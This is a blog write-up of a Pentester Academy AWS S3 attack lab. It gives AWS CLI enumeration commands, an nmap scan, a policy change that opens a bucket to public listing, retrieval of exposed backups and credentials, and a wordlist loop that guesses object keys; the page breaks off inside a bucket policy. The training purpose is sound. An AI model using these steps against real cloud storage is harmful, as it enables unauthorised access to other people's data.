<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="Pentester Academy AWS S3 Attack Lab" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="https://tanishq.page/blog/posts/pentester-academy-aws-s3/" /><meta property="og:url" content="https://tanishq.page/blog/posts/pentester-academy-aws-s3/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-28T02:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Pentester Academy AWS S3 Attack Lab" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-28T02:00:00-05:00","datePublished":"2022-04-28T02:00:00-05:00","description":"Enumeration","headline":"Pentester Academy AWS S3 Attack Lab","mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog/posts/pentester-academy-aws-s3/"},"url":"https://tanishq.page/blog/posts/pentester-academy-aws-s3/"}</script><title>Pentester Academy AWS S3 Attack Lab | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.notify(); } /* flipMode() */ } /* ModeToggle */ const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/blog/" id="avatar" class="rounded-circle"><img src="/blog/assets/Abstract.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/blog/">Tanishq Rupaal</a></h1><p class="site-subtitle fst-italic mb-0">Cybersecurity Professional</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/blog/"> Home </a> </span> <span>Pentester Academy AWS S3 Attack Lab</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Pentester Academy AWS S3 Attack Lab</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1651129200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 28, 2022 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2188 words" > <em>12 min</em> read</span></div></div></header><div class="content"><h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li><p>List buckets and get region for bucket →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> <span class="c"># List buckets using s3api</span>
 awsn s3api list-buckets | jq <span class="s1">'.Buckets[] | .Name'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span>

 <span class="c"># Get region for bucket</span>
 awsn s3api get-bucket-location <span class="nt">--bucket</span> insecurecorp-code | jq <span class="s1">'.LocationConstraint'</span>
</pre></table></code></div></div><li><p>Get versioning for buckets →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> <span class="c"># For a single bucket</span>
 awsn s3api get-bucket-versioning <span class="nt">--bucket</span> data-extractor-repo | jq <span class="s1">'.Status'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span>

 <span class="c"># Get names of buckets with versioning enabled</span>
 <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>awsn s3api list-buckets | jq <span class="s1">'.Buckets[] | .Name'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span><span class="p">;</span> <span class="k">do
 if</span> <span class="o">[[</span> <span class="si">$(</span>awsn s3api get-bucket-versioning <span class="nt">--bucket</span> <span class="nv">$i</span> 2&gt;/dev/null | jq <span class="s1">'.Status'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span> <span class="o">==</span> <span class="s2">"Enabled"</span> <span class="o">]]</span>
 <span class="k">then </span><span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="k">done</span>
</pre></table></code></div></div><li><p>List objects and versions in a bucket →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> <span class="c"># List objects in a bucket</span>
 awsn s3api list-objects <span class="nt">--bucket</span> data-extractor-repo

 <span class="c"># List object versions</span>
 <span class="c"># Prefix will match the given string from the beginning of objects</span>
 <span class="c"># It can be used with a Delimiter so that everything starting with prefix up to</span>
 <span class="c"># the delimiter is matched and returned</span>
 awsn s3api list-object-versions <span class="nt">--bucket</span> data-extractor-repo <span class="nt">--prefix</span> index.html
</pre></table></code></div></div><li><p>Get special information on bucket →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> <span class="c"># Know if bucket is public or not</span>
 awsn s3api get-public-access-block <span class="nt">--bucket</span> insecurecorp-code

 <span class="c"># Get policy for bucket</span>
 awsn s3api get-bucket-policy <span class="nt">--bucket</span> insecurecorp-code <span class="nt">--output</span> text | jq

 <span class="c"># Get ACL for bucket</span>
 awsn s3api get-bucket-acl <span class="nt">--bucket</span> insecurecorp-code

 <span class="c"># Get Logging information for bucket</span>
 awsn s3api get-bucket-logging <span class="nt">--bucket</span> insecurecorp-code
</pre></table></code></div></div></ol><hr /><h2 id="basics"><span class="me-2">Basics</span><a href="#basics" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>Identify the S3 endpoint →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># Identification of S3 endpoint can be done by using nmap</span>
nmap <span class="nt">-sV</span> 192.37.2.3
</pre></table></code></div></div><p>This gives an output of unknown service <code class="language-plaintext highlighter-rouge">cslistener</code> running at port 9000 along with some HTTP type return. Using <code class="language-plaintext highlighter-rouge">curl</code> on this endpoint gives the following →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>http://192.37.2.3:9000 <span class="nt">-v</span>

<span class="k">*</span> Rebuilt URL to: http://192.37.2.3:9000/
<span class="k">*</span>   Trying 192.37.2.3...
<span class="k">*</span> TCP_NODELAY <span class="nb">set</span>
<span class="k">*</span> Connected to 192.37.2.3 <span class="o">(</span>192.37.2.3<span class="o">)</span> port 9000 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET / HTTP/1.1
<span class="o">&gt;</span> Host: 192.37.2.3:9000
<span class="o">&gt;</span> User-Agent: curl/7.58.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span>
&lt; HTTP/1.1 403 Forbidden
&lt; Accept-Ranges: bytes
&lt; Content-Length: 226
&lt; Content-Security-Policy: block-all-mixed-content
&lt; Content-Type: application/xml
&lt; Server: MinIO/RELEASE.2019-09-05T23-24-38Z
&lt; Vary: Origin
&lt; X-Amz-Request-Id: 16E69AAC117238E7
&lt; X-Xss-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
&lt; Date: Sun, 17 Apr 2022 06:19:37 GMT
&lt;
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
<span class="k">*</span> Connection <span class="c">#0 to host 192.37.2.3 left intact</span>
&lt;Error&gt;&lt;Code&gt;AccessDenied&lt;/Code&gt;&lt;Message&gt;Access Denied.&lt;/Message&gt;&lt;Resource&gt;/&lt;/Resource&gt;&lt;RequestId&gt;16E69AAC117238E7&lt;/RequestId&gt;&lt;HostId&gt;49db7dfe-bdf5-4b2b-bbba-7e3fb2d7e1a3&lt;/HostId&gt;&lt;/Error&gt;
</pre></table></code></div></div><p>The headers contain <code class="language-plaintext highlighter-rouge">X-Amz-Request-Id</code> which signifies that the resource is an Amazon service and the server can be seen as <code class="language-plaintext highlighter-rouge">Minio</code> which is an open source S3 service.</p><ol><li>List all buckets owned by the current user and the contents of the <code class="language-plaintext highlighter-rouge">hello-world</code> bucket →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># Using the endpoint flag to specify a specific endpoint</span>
aws <span class="nt">--endpoint</span> http://192.37.2.3:9000 s3api list-buckets

<span class="c"># List the objects within the hello-world bucket</span>
aws <span class="nt">--endpoint</span> http://192.37.2.3:9000 s3api list-objects <span class="nt">--bucket</span> hello-world
</pre></table></code></div></div><ol><li>Get the objects from the <code class="language-plaintext highlighter-rouge">hello-world</code> bucket to retrieve the flag →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># The key can be mentioned to retrieve specific objects and the next argument is the outfile</span>
aws <span class="nt">--endpoint</span> http://192.37.2.3:9000 s3api get-object <span class="nt">--key</span> flag flag <span class="nt">--bucket</span> hello-world
</pre></table></code></div></div><ol><li>Put a file into the bucket →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># Make a new file</span>
<span class="nb">echo</span> <span class="s2">"hello-world"</span> <span class="o">&gt;</span> file

<span class="c"># Upload to the bucket</span>
aws <span class="nt">--endpoint</span> http://192.37.2.3:9000 s3api put-object <span class="nt">--key</span> file <span class="nt">--body</span> file <span class="nt">--bucket</span> hello-world
<span class="c"># Can also use s3 cp command</span>
<span class="c"># Using the s3api command without body flag will make an object of size 0 bytes</span>
</pre></table></code></div></div><ol><li>Check permissions to retrieve objects from bucket <code class="language-plaintext highlighter-rouge">welcome</code> →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="nv">$ </span>aws <span class="nt">--endpoint</span> http://192.37.2.3:9000 s3api get-bucket-policy <span class="nt">--bucket</span> welcome <span class="nt">--output</span> text | python3 <span class="nt">-m</span> json.tool
<span class="o">{</span>
    <span class="s2">"Version"</span>: <span class="s2">"2012-10-17"</span>,
    <span class="s2">"Statement"</span>: <span class="o">[</span>
        <span class="o">{</span>
            <span class="s2">"Sid"</span>: <span class="s2">"AddPerm"</span>,
            <span class="s2">"Effect"</span>: <span class="s2">"Allow"</span>,
            <span class="s2">"Principal"</span>: <span class="o">{</span>
                <span class="s2">"AWS"</span>: <span class="o">[</span>
                    <span class="s2">"*"</span>
                <span class="o">]</span>
            <span class="o">}</span>,
            <span class="s2">"Action"</span>: <span class="o">[</span>
                <span class="s2">"s3:GetObject"</span>
            <span class="o">]</span>,
            <span class="s2">"Resource"</span>: <span class="o">[</span>
                <span class="s2">"arn:aws:s3:::welcome/*"</span>
            <span class="o">]</span>
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>
</pre></table></code></div></div><p>This means that anyone can retrieve objects from the bucket but NOT list them as <code class="language-plaintext highlighter-rouge">s3:ListBucket</code> is not present.</p><ol><li>Modify policy of <code class="language-plaintext highlighter-rouge">welcome</code> bucket to allow listing by anyone →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> <span class="o">&gt;</span> policy.json
<span class="o">{</span>
    <span class="s2">"Version"</span>: <span class="s2">"2012-10-17"</span>,
    <span class="s2">"Statement"</span>: <span class="o">[</span>
        <span class="o">{</span>
            <span class="s2">"Sid"</span>: <span class="s2">"AddPerm"</span>,
            <span class="s2">"Effect"</span>: <span class="s2">"Allow"</span>,
            <span class="s2">"Principal"</span>: <span class="o">{</span>
                <span class="s2">"AWS"</span>: <span class="o">[</span>
                    <span class="s2">"*"</span>
                <span class="o">]</span>
            <span class="o">}</span>,
            <span class="s2">"Action"</span>: <span class="o">[</span>
                <span class="s2">"s3:GetObject"</span>
            <span class="o">]</span>,
            <span class="s2">"Resource"</span>: <span class="o">[</span>
                <span class="s2">"arn:aws:s3:::welcome/*"</span>
            <span class="o">]</span>
        <span class="o">}</span>,
        <span class="o">{</span>
            <span class="s2">"Sid"</span>: <span class="s2">"Addednew"</span>,
            <span class="s2">"Effect"</span>: <span class="s2">"Allow"</span>,
            <span class="s2">"Principal"</span>: <span class="o">{</span>
                <span class="s2">"AWS"</span>: <span class="s2">"*"</span>
            <span class="o">}</span>,
            <span class="s2">"Action"</span>: <span class="s2">"s3:ListBucket"</span>,
            <span class="s2">"Resource"</span>: <span class="o">[</span>
                <span class="s2">"arn:aws:s3:::welcome"</span>
            <span class="o">]</span>
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>

<span class="c"># Add the policy to the bucket</span>
aws <span class="nt">--endpoint</span> http://192.37.2.3:9000 s3api put-bucket-policy <span class="nt">--policy</span> file://policy.json <span class="nt">--bucket</span> welcome
</pre></table></code></div></div><p>The objects can be listed now from <code class="language-plaintext highlighter-rouge">http://192.37.2.3:9000/welcome</code> using <code class="language-plaintext highlighter-rouge">curl</code>.</p><ol><li>Delete an object from the <code class="language-plaintext highlighter-rouge">hello-world</code> bucket →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aws <span class="nt">--endpoint</span> http://192.37.2.3:9000 s3api delete-object <span class="nt">--key</span> <span class="s2">"welcome"</span> <span class="nt">--bucket</span> hello-world
</pre></table></code></div></div><hr /><h2 id="sensitive-data-exposure"><span class="me-2">Sensitive Data Exposure</span><a href="#sensitive-data-exposure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The Lab exposes a URL → <a href="https://uyphi3oonj.execute-api.ap-southeast-1.amazonaws.com/default">https://uyphi3oonj.execute-api.ap-southeast-1.amazonaws.com/default</a></p><p>The page loads static contents from an S3 bucket. This gives the name of the bucket as <code class="language-plaintext highlighter-rouge">lab-webapp-static-resources</code>. Enumerating objects by public permissions →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aws s3 <span class="nb">cp </span>s3://lab-webapp-static-resources/scripts/backup.sh ./backup.sh <span class="nt">--no-sign-request</span>
</pre></table></code></div></div><p>The backup file contains a <code class="language-plaintext highlighter-rouge">curl</code> request to download a backup of user data. This downloaded data contains a flag as well as user credentials.</p><hr /><h2 id="s3-guessable-object"><span class="me-2">S3 Guessable Object</span><a href="#s3-guessable-object" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The Lab provides an endpoint which has a bucket <code class="language-plaintext highlighter-rouge">public</code> with a policy to allow retrieval of objects however, not for listing the buckets or objects. An existing key can be searched for within a brute force wordlist and attempting to <code class="language-plaintext highlighter-rouge">curl</code> them as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> /usr/share/dirb/wordlists/small.txt<span class="si">)</span>
<span class="k">do
</span>curl <span class="nt">-s</span> http://192.96.62.3:9000/public/<span class="nv">$i</span> | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"(key does not exist)|(encoding)"</span>
<span class="k">done</span>
</pre></table></code></div></div><hr /><h2 id="hardcoded-credentials"><span class="me-2">Hardcoded Credentials</span><a href="#hardcoded-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The Lab provided credentials for a random IAM user who had general permissions to read the <code class="language-plaintext highlighter-rouge">upload-xxx</code> bucket but not the <code class="language-plaintext highlighter-rouge">flag-xxx</code> bucket. However, the <code class="language-plaintext highlighter-rouge">upload-xxx</code> bucket contained hardcoded AWS credentials which allows access as the <code class="language-plaintext highlighter-rouge">admin</code> user which had the permissions to read from all buckets and could therefore retrieve the flag.</p><hr /><h2 id="readable-bucket-policy"><span class="me-2">Readable Bucket Policy</span><a href="#readable-bucket-policy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab gives a bucket that has the following bucket policy →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3:GetBucketPolicy"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::s3-readable-policy-117119606323"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Deny"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3:List*"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::s3-readable-policy-117119606323"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3:GetObject"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::s3-readable-policy-117119606323/this-is-flag"</span><span class="w">
